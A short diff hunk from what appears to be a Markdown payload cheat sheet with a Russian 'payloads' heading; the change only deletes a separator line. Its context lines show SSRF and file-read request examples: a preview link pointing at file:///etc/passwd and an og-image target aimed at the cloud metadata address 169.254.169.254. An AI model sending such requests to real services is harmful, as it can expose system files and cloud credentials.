@@ -46,7 +46,6 @@ GET /preview?link=file:///etc/passwd
 POST /og-image
 data: target=http://169.254.169.254/latest/meta-data/
 
----
 
 
 ## 💥 ПЕЙЛОАДЫ
